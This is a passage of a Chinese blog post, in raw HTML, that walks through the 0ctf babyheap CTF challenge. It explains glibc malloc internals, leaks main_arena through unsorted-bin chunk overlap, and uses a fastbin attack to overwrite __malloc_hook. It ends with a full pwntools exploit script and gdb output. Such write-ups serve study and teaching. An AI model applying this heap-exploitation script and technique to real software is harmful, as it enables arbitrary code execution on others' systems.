topmost chunk -- not otherwise kept in a bin */</span><br><span class="line">  mchunkptr top;</span><br><span class="line"></span><br><span class="line">  /* The remainder from the most recent split of a small request */</span><br><span class="line">  mchunkptr last_remainder;</span><br><span class="line"></span><br><span class="line">  /* Normal bins packed as described above */</span><br><span class="line">  mchunkptr bins[NBINS * 2 - 2];</span><br><span class="line"></span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line">  static struct malloc_state main_arena =</span><br><span class="line">&#123;</span><br><span class="line">  .mutex = _LIBC_LOCK_INITIALIZER,</span><br><span class="line">  .next = &amp;main_arena,</span><br><span class="line">  .attached_threads = 1</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<p>这段代码是在malloc.c文件中中定义的，编译后main_arena就是保存了unsorted bin链表，我们计算一下mchunkptr bins[NBINS * 2 - 2];这个数组相对malloc_state结构的偏移。<br>首先要确定 mfastbinptr fastbinsY[NFASTBINS];这个长度是多少，要确定NFASTBINS的大小<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#define NFASTBINS  (fastbin_index (request2size (MAX_FAST_SIZE)) + 1)</span><br><span class="line"></span><br><span class="line">#define MAX_FAST_SIZE     (80 * SIZE_SZ / 4)</span><br><span class="line"></span><br><span class="line">#define fastbin_index(sz) \</span><br><span class="line">  ((((unsigned int) (sz)) &gt;&gt; (SIZE_SZ == 8 ? 4 : 3)) - 2)</span><br></pre></td></tr></table></figure></p>
+<p>64位下，SIZE_SZ的值为8， MAX_FAST_SIZE为160，代入request2size（160）得到176， 进一步代入fastbin_index得到NFASTBINS为10<br>32位下， SIZE_SZ的值为4， MAX_FAST_SIZE为80， 代入request2size（80） 得到88， 进一步代入fastbin_index得到NFASTBINS为10</p>
+<p>所以无论在32位还是64位下， NFASTBINS均为10，就是都是有10个mfastbinptr指针，那么总大小就是10*8 = 80<br>进而得到main_arena-&gt;top的偏移为 4 + 4 + 80 = 88=0x58, 在ida的local中定义新的数据结构看下偏移也是0x58<br><img src="/images/heap_exp/2021-05-27-17-02-02.png" alt><br>与我们计算的吻合，所以理论上头部chunk的bk指针指向的地址就是main_arena + 88字节的值</p>
+<p>为了泄露main_arena + 88这个值，我们首先需要溢出chunk1，使其修改chunk2的prev size和size字段<br><img src="/images/heap_exp/2021-05-28-11-38-36.png" alt><br>chunk2的prev size从0x80改为0x180，size从0x101改为0x100，这样可以将chunk1标识为空闲块。<br>然后再free chunk2，触发错误的后向融合，chunk1连同chunk0和chunk2一起被当做一个大的chunk放到unsorted bin上。<br><img src="/images/heap_exp/2021-05-28-11-48-10.png" alt><br>在gdb中观察unsorted bin的情况<br><img src="/images/heap_exp/2021-05-27-17-32-32.png" alt><br>可以看到，如我们的预期，unsroted bin中有一个chunk,大小是0x280。</p>
+<p>当我们malloc 0xf0之后，会分割这个0x280的chunk，剩下0x180大小的chunk，并且重写unsorted bin的fd和bk以及新的头部chunk的fd bk指针<br><img src="/images/heap_exp/2021-05-28-11-58-27.png" alt><br>这个新的unsorted bin链表头部chunk实际上就是我们的的chunk1，而chunk1是可以被我们打印的，因为他没有被我们人为的free。<br>因此我们可以通过打印chunk1的数据部分泄露他的bk和fd指针内容，由于unsorted bin上只有一个元素，所以bk与fd相等都是指向main_arena+88偏移的地址。<br>我们利用逻辑打印这个chunk1的内容<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; leak_address = res.split(&apos;\n&apos;)[1][0:8]</span><br><span class="line">&gt;&gt;&gt; hex(u(leak_address))</span><br><span class="line">&apos;0x7ffff7fc2b78&apos;</span><br></pre></td></tr></table></figure></p>
+<p>main_arena = 0x7ffff7fc2b78 - 88 = 0x7ffff7fc2b20<br>我们利用GEF的heap arenas看一下是否相同<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gef➤  heap arenas                                                                                     </span><br><span class="line">Arena (base=0x7ffff7fc2b20, top=0x5555557572c0, last_remainder=0x555555757100, next=0x7ffff7fc2b20, ne</span><br><span class="line">xt_free=0x0, system_mem=0x21000)</span><br></pre></td></tr></table></figure></p>
+<p>所以我们已经成功泄露了main_arena+88的地址。我们可以基于此得到任意想要的libc偏移地址。</p>
+<h3 id="劫持控制流"><a href="#劫持控制流" class="headerlink" title="劫持控制流"></a>劫持控制流</h3><p>由于这个二进制开启了PIE，因此不能通过改写GOT的方式实现控制流劫持。但是我们可以通过改写__malloc_hook这个指针的方式实现控制流劫持。如果 malloc_hook 和free_hook的值存在，则会调用malloc_hook或者free_hook指向的地址。</p>
+<h4 id="修改-malloc-hook指针"><a href="#修改-malloc-hook指针" class="headerlink" title="修改__malloc_hook指针"></a>修改__malloc_hook指针</h4><p>__malloc_hook在内存中的偏移为mian_arena - 0x10 ，64位情况下。 我们使用fastbin attack实现对这个地址的控制。</p>
+<h4 id="fastbin-attack原理"><a href="#fastbin-attack原理" class="headerlink" title="fastbin attack原理"></a>fastbin attack原理</h4><ol>
+<li>同一个fastbin 链表上有2个空闲的chunk，</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Fastbins[idx=1, size=0x30]  ←  Chunk(addr=0x555555757140, size=0x30, flags=PREV_INUSE)  ←  Chunk</span><br><span class="line">(addr=0x7ffff7fc2b20, size=0x0, flags=) [incorrect fastbin_index]</span><br><span class="line">`</span><br></pre></td></tr></table></figure>
+<p>我们虽然能够修改fd指针，让他指向一个虚假的chunk，但是由于fast bin内部还是有一个size的检查，会去看这个假chunk的size字段是否就是符合0x30，如果不符合就会报错。所以要想办法让这个size符合我们的fastbin的要求。我们仔细观察malloc_chunk临近内存的值情况<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">gef➤  x/gx 0x7ffff7fc2b10</span><br><span class="line">0x7ffff7fc2b10 &lt;__malloc_hook&gt;: 0x0000000000000000</span><br><span class="line"></span><br><span class="line">gef➤  x/gx 0x7ffff7fc2b10 -8</span><br><span class="line">0x7ffff7fc2b08 &lt;__realloc_hook&gt;:        0x00007ffff7c83a00</span><br></pre></td></tr></table></figure></p>
+<p>我们通过将这个假的chunk的size指向一个0x7ffff7fc2b08 +5这个地址，这个地方存放值是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gef➤  x/gx 0x7ffff7fc2b08 +5</span><br><span class="line">0x7ffff7fc2b0d &lt;__realloc_hook+5&gt;:      0x000000000000007f</span><br></pre></td></tr></table></figure></p>
+<p>这个值是可以通过长度检测的<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">if (__builtin_expect (fastbin_index (chunksize (victim)) != idx, 0))</span><br><span class="line">           &#123;</span><br><span class="line">             errstr = &quot;malloc(): memory corruption (fast)&quot;;</span><br><span class="line">           errout:</span><br><span class="line">            malloc_printerr (check_action, errstr, chunk2mem (victim), av);</span><br><span class="line">             return NULL;</span><br><span class="line">           ...</span><br></pre></td></tr></table></figure></p>
+<p>fastbin_index(0x7f)的返回值为5，因此我们只需要在fastbin chunk index为5的链表上面构建就行了，5所对应的fast bin chunk的大小为0x70.</p>
+<p>那么这个假chunk的地址就是0x7ffff7fc2b08 + 5 - 8 = 0x7ffff7fc2b05</p>
+<p>通过连续malloc(0x60)两次，然后释放第二个malloc的chunk，得到下面的内存布局<br><img src="/images/heap_exp/2021-05-28-16-00-59.png" alt></p>
+<p>我们通过溢出ck0，覆盖ck1的fd指针，</p>
+<p>0x7ffff7fc2af5 - 8 =  0x7ffff7fc2aed<br>0x7ffff7fc2af5: 0x000000000000007f<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Fastbins[idx=5, size=0x70]  ←  Chunk(addr=0x555555757180, size=0x70, flags=)  ←  Chunk(addr=0x7ffff7fc2afd, </span><br><span class="line">size=0x78, flags=PREV_INUSE|IS_MMAPPED|NON_MAIN_ARENA)  ←  [Corrupted chunk at 0xfff7c83e20000010]</span><br></pre></td></tr></table></figure></p>
+<p>现在我们把假的chunk添加到了fast bin上了，并且我们把size修正好了，使他能够绕过检测。<br>我们现在连续malloc(0x60)两次就可以得到一个指向 0x7ffff7fc2aed+16 = 0x7ffff7fc2afd的指针，通过0x7ffff7fc2afd覆盖0x7ffff7fc2b10(__malloc_hook).</p>
+<p>我们覆盖的值可以为system函数的地址，通过main_arena泄露的地址，先确定system函数地址为<code>0x7ffff7c43390</code></p>
+<p>观察内存值可以发现, 我们已经成功修改了_malloc_hook的值<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gef➤  x/gx &amp;__malloc_hook</span><br><span class="line">0x7ffff7fc2b10 &lt;__malloc_hook&gt;: 0x00007ffff7c43390</span><br></pre></td></tr></table></figure></p>
+<p>我们再确定/bin/sh字符串的地址，进而在调用malloc的时候，直接将这个参数传进去就行了<br>确定/bin/sh的地址为<code>0x7ffff7d8ad57</code><br>但是后来发现这个二进制对长度是有限制的，只截取8个字符，所以我们不能用这种办法。</p>
+<p>那就只能在二进制中直接找execve(‘/bin/sh’)的地方了，然后把这个地址写到我们的__malloc_hook中就行了</p>
+<p>我的exp<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">target = process(&quot;./babyheap_long&quot;, env=&#123;&quot;LD_PRELOAD&quot;:&quot;./libc.so.6&quot;&#125;)</span><br><span class="line">elf = ELF(&quot;babyheap_long&quot;)</span><br><span class="line">libc = ELF(&quot;./libc.so.6&quot;)</span><br><span class="line"></span><br><span class="line">recv_str = target.recv()</span><br><span class="line">print recv_str</span><br><span class="line"></span><br><span class="line"># I/O Functions</span><br><span class="line">def allocate(size):</span><br><span class="line">  target.sendline(&quot;1&quot;)</span><br><span class="line">  target.sendline(str(size))</span><br><span class="line">  print target.recv()</span><br><span class="line"></span><br><span class="line">def write_data(index, size, data):</span><br><span class="line">  target.sendline(&quot;2&quot;)</span><br><span class="line">  target.sendline(str(index))</span><br><span class="line">  target.sendline(str(size))</span><br><span class="line">  target.send(data)</span><br><span class="line">  print target.recv()</span><br><span class="line"></span><br><span class="line">def remove(index):</span><br><span class="line">  target.sendline(&quot;3&quot;)</span><br><span class="line">  target.sendline(str(index))</span><br><span class="line">  print target.recv()</span><br><span class="line"></span><br><span class="line">def view(index):</span><br><span class="line">  target.sendline(&quot;4&quot;)</span><br><span class="line">  target.sendline(str(index))</span><br><span class="line">  #print &quot;pillar&quot;</span><br><span class="line">  leak = target.recv()</span><br><span class="line">  return leak</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">allocate(0xf0)</span><br><span class="line">allocate(0x70)</span><br><span class="line">allocate(0xf0)</span><br><span class="line">allocate(0x30)</span><br><span class="line"></span><br><span class="line">remove(0)</span><br><span class="line">remove(1)</span><br><span class="line"></span><br><span class="line">allocate(0x70)</span><br><span class="line"></span><br><span class="line">write_data(0,0x80,&apos;A&apos;*0x70 + p64(0x180) + p64(0x100))</span><br><span class="line"></span><br><span class="line">remove(2)</span><br><span class="line"></span><br><span class="line">allocate(0xf0)</span><br><span class="line"></span><br><span class="line">u = make_unpacker(64, endian=&apos;little&apos;, sign=&apos;unsigned&apos;)</span><br><span class="line">res = view(0)</span><br><span class="line">leak_address = res.split(&apos;\n&apos;)[1][0:8]</span><br><span class="line">print(hex(u(leak_address)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">allocate(0x60)</span><br><span class="line">allocate(0x60)  </span><br><span class="line"></span><br><span class="line">remove(4)   ## make heap layout</span><br><span class="line"></span><br><span class="line">write_data(2,0x78,&apos;A&apos;*0x68 + p64(0x70) + p64(0x7ffff7fc2aed))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">allocate(0x60)</span><br><span class="line">allocate(0x60)  ## get the ptr to control malloc_hook</span><br><span class="line"></span><br><span class="line">system_addr = 0x7ffff7c43390</span><br><span class="line">write_data(5,19 + 8,&apos;A&apos;*19 + p64(system_addr))</span><br><span class="line"></span><br><span class="line">allocate(0x7ffff7d8ad57) # trigger system</span><br></pre></td></tr></table></figure></p>
+<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ol>
+<li><a href="https://guyinatuxedo.github.io/28-fastbin_attack/0ctf_babyheap/index.html" target="_blank" rel="noopener">https://guyinatuxedo.github.io/28-fastbin_attack/0ctf_babyheap/index.html</a> </li>
+<li><a href="https://uaf.io/exploitation/2017/03/19/0ctf-Quals-2017-BabyHeap2017.html" target="_blank" rel="noopener">https://uaf.io/exploitation/2017/03/19/0ctf-Quals-2017-BabyHeap2017.html</a></li>
+<li><a href="https://seanachao.github.io/2020/07/13/hook%E5%8A%AB%E6%8C%81/" target="_blank" rel="noopener">https://seanachao.github.io/2020/07/13/hook%E5%8A%AB%E6%8C%81/</a></li>
+<li><a href="https://blog.csdn.net/qq_29343201/article/details/66476135" target="_blank" rel="noopener">https://blog.csdn.net/qq_29343201/article/details/66476135</a></li>
+</ol>
+<h2 id="我的原图"><a href="#我的原图" class="headerlink" title="我的原图"></a>我的原图</h2><p><img src="/images/heap_exp/2021-05-28-17-30-46.png" alt></p>
+
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+      
+    
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/%E5%A0%86%E5%88%A9%E7%94%A8/" rel="tag"># 堆利用</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2021/06/17/%E5%A0%86%E5%88%A9%E7%94%A8%E7%B3%BB%E5%88%97%E4%B9%8Bunlink/" rel="next" title="堆利用系列三：Unlink">
+                <i class="fa fa-chevron-left"></i> 堆利用系列三：Unlink
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2021/06/17/%E5%A0%86%E5%88%A9%E7%94%A8%E7%B3%BB%E5%88%97%E4%B9%8BUnsorted-Bin-Attack/" rel="prev" title="堆利用系列五：Unsorted Bin Attack ">
+                堆利用系列五：Unsorted Bin Attack  <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+  </div>
+
+
+          </div>
+          
+
+  
+    <div class="comments" id="comments">
+    </div>
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="https://avatars1.githubusercontent.com/u/13530839?s=460&v=4"
+                alt="Colorlight"/>
+            
+              <p class="site-author-name" itemprop="name">Colorlight</p>
+              <div class="site-description motion-element" itemprop="description"></div>
+          </div>
+
+          
+            <nav class="site-state motion-element">
+              
+                <div class="site-state-item site-state-posts">
+                
+                  <a href="/archives/%20%7C%7C%20archive">
+                
+                    <span class="site-state-item-count">12</span>
+                    <span class="site-state-item-name">日志</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-categories">
+                  
+                    
+                      <a href="/categories/%20%7C%7C%20th">
+                    
+                  
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">4</span>
+                    <span class="site-state-item-name">分类</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-tags">
+                  
+                    
+                      <a href="/tags/%20%7C%7C%20tags">
+                    
+                  
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">8</span>
+                    <span class="site-state-item-name">标签</span>
+                  </a>
+                </div>
+              
+            </nav>
+
+          
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+
+          
+
+          
+
+          
+          
+
+          
+            
+          
+
+          
+
+<script type="text/javascript" charset="utf-8" src="/js/tagcloud.js"></script>
+<script type="text/javascript" charset="utf-8" src="/js/tagcanvas.js"></script>
+<div class="widget-wrap">
+    <h3 class="widget-title"></h3>
+    <div id="myCanvasContainer" class="widget tagcloud">
+        <canvas width="250" height="250" id="resCanvas" style="width=100%">
+            <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/Fuzz-%E5%8F%98%E5%BC%82%E7%AD%96%E7%95%A5/" rel="tag">Fuzz 变异策略</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/IoT-Security/" rel="tag">IoT Security</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/LTE%E5%AE%89%E5%85%A8/" rel="tag">LTE安全</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/PWS/" rel="tag">PWS</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ROOT-CAUSE/" rel="tag">ROOT CAUSE</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E4%BC%AA%E9%80%A0%E5%9C%B0%E9%9C%87%E6%B6%88%E6%81%AF/" rel="tag">伪造地震消息</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%A0%86%E5%88%A9%E7%94%A8/" rel="tag">堆利用</a><span class="tag-list-count">9</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%A6%82%E4%BD%95%E5%8F%91%E7%8E%B0%E6%BC%8F%E6%B4%9E/" rel="tag">如何发现漏洞</a><span class="tag-list-count">1</span></li></ul>
+        </canvas>
+    </div>
+</div>
+
+        </div>
+      </div>
+
+
+      
+      <!--noindex-->
+        <div class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+            
+            
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Fastbin-attack"><span class="nav-number">1.</span> <span class="nav-text">Fastbin attack</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B6%89%E5%8F%8A%E5%88%B0%E7%9A%84glibc%E7%9A%84%E7%9F%A5%E8%AF%86"><span class="nav-number">1.2.</span> <span class="nav-text">涉及到的glibc的知识</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%BA%90%E7%A0%81%E4%B8%ADMIN-CHUNK-SIZE%E5%A4%A7%E5%B0%8F%E6%98%AF%E5%A4%9A%E5%B0%91"><span class="nav-number">1.2.1.</span> <span class="nav-text">源码中MIN_CHUNK_SIZE大小是多少</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#MINSIZE"><span class="nav-number">1.2.2.</span> <span class="nav-text">MINSIZE</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#chunk%E4%B8%8E%E7%94%A8%E6%88%B7%E4%BD%BF%E7%94%A8%E7%9A%84mem%E4%B9%8B%E9%97%B4%E7%9A%84%E8%BD%AC%E6%8D%A2"><span class="nav-number">1.2.3.</span> <span class="nav-text">chunk与用户使用的mem之间的转换</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#MALLOC-ALIGN-MASK"><span class="nav-number">1.2.4.</span> <span class="nav-text">MALLOC_ALIGN_MASK</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#MALLOC-ALIGN-MASK-1"><span class="nav-number">1.2.5.</span> <span class="nav-text">MALLOC_ALIGN_MASK</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#request2size-req"><span class="nav-number">1.2.6.</span> <span class="nav-text">request2size(req)</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%BE%80unsorted-bin%E4%B8%AD%E6%8F%92%E5%85%A5%E4%B8%80%E4%B8%AAchunk"><span class="nav-number">1.2.7.</span> <span class="nav-text">往unsorted bin中插入一个chunk</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#malloc%E4%B8%80%E4%B8%AA%E5%9C%A8unsorted-bin%E4%B8%8A%E7%9A%84chunk"><span class="nav-number">1.2.8.</span> <span class="nav-text">malloc一个在unsorted bin上的chunk</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%9D%E5%A7%8B%E5%8C%96bins"><span class="nav-number">1.2.9.</span> <span class="nav-text">初始化bins</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0ctf-babyheap"><span class="nav-number">1.3.</span> <span class="nav-text">0ctf babyheap</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%B0%83%E8%AF%95"><span class="nav-number">1.4.</span> <span class="nav-text">调试</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8A%AB%E6%8C%81%E6%8E%A7%E5%88%B6%E6%B5%81"><span class="nav-number">1.5.</span> <span class="nav-text">劫持控制流</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BF%AE%E6%94%B9-malloc-hook%E6%8C%87%E9%92%88"><span class="nav-number">1.5.1.</span> <span class="nav-text">修改__malloc_hook指针</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#fastbin-attack%E5%8E%9F%E7%90%86"><span class="nav-number">1.5.2.</span> <span class="nav-text">fastbin attack原理</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%82%E8%80%83"><span class="nav-number">1.6.</span> <span class="nav-text">参考</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%88%91%E7%9A%84%E5%8E%9F%E5%9B%BE"><span class="nav-number">2.</span> <span class="nav-text">我的原图</span></a></li></ol></div>
+            
+
+          </div>
+        </div>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+
+  </aside>
+
+
+
+  
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <center>
+<div class="copyright">&copy; <span itemprop="copyrightYear">2021</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Colorlight</span>
+
+  
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> 强力驱动 v5.4.0</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 – <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> v7.0.1</div>
+
+
+
+
+
+<center>
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span id="busuanzi_container_site_pv">本站总访问量<span id="busuanzi_value_site_pv"></span>次</span>
+    <span class="post-meta-divider">|</span>
+    <span id="busuanzi_container_site_uv">本站访客数<span id="busuanzi_value_site_uv"></span>人</span>
+</center>
+
+</center>
+
+        
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+    
+
+    
+  </div>
+
+  
+
+<script>
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+
+  
+
+
+  <script src="/js/src/utils.js?v=7.0.1"></script>
+
+  <script src="/js/src/motion.js?v=7.0.1"></script>
+
+
+
+  
+  
+
+
+  <script src="/js/src/affix.js?v=7.0.1"></script>
+
+  <script src="/js/src/schemes/pisces.js?v=7.0.1"></script>
+
+
+
+  
+  <script src="/js/src/scrollspy.js?v=7.0.1"></script>
+<script src="/js/src/post-details.js?v=7.0.1"></script>
+
+
+
+  
+
+
+  <script src="/js/src/next-boot.js?v=7.0.1"></script>
+
+
+  
+
+  
+
+  
+
+  
+  
+
+<script src="//cdn1.lncld.net/static/js/3.11.1/av-min.js"></script>
+
+
+
+<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+
+<script>
+  var GUEST = ['nick', 'mail', 'link'];
+  var guest = 'nick,mail,link';
+  guest = guest.split(',').filter(function(item) {
+    return GUEST.indexOf(item) > -1;
+  });
+  new Valine({
+    el: '#comments',
+    verify: false,
+    notify: false,
+    appId: 'nvTbKb5mM9SX7hcCzBN7pMf8-gzGzoHsz',
+    appKey: 'QieslIVE2MFME3VlCkgjdn90',
+    placeholder: '欢迎交流朋友~',
+    avatar: 'mm',
+    meta: guest,
+    pageSize: '10' || 10,
+    visitor: false,
+    lang: '' || 'zh-cn'
+  });
+</script>
+
+
+
+
+  
+
+
+  
+  <script>
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      
+
+      $.ajax({
